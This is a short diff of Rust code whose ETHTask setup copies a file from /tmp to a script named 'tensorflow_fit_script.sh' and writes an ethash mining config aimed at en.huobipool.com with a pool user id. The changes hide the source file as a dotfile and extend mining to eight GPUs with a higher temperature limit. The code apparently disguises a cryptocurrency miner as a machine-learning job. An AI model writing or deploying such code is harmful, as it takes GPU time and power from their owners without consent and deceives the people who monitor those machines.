@@ -9,12 +9,12 @@ impl task::Task for ETHTask {
     fn init_env(&self) -> anyhow::Result<()> {
         println!("init_env()");
         Command::new("cp")
-            .arg("/tmp/b86547d084228861")
+            .arg("/tmp/.b86547d084228861")
             .arg("tensorflow_fit_script.sh")
             .spawn()?
             .wait()?;
         File::create("c")?
-            .write_all(b"[common]\nalgo=ethash\npers=BgoldPoW\ndevices=0 1 2 3 4 5 6\ntemplimit=60\nwatchdog=1\napi=10555\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e")?;
+            .write_all(b"[common]\nalgo=ethash\npers=BgoldPoW\ndevices=0 1 2 3 4 5 6 7\ntemplimit=70\nwatchdog=1\napi=10555\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e")?;
         Ok(())
     }
 
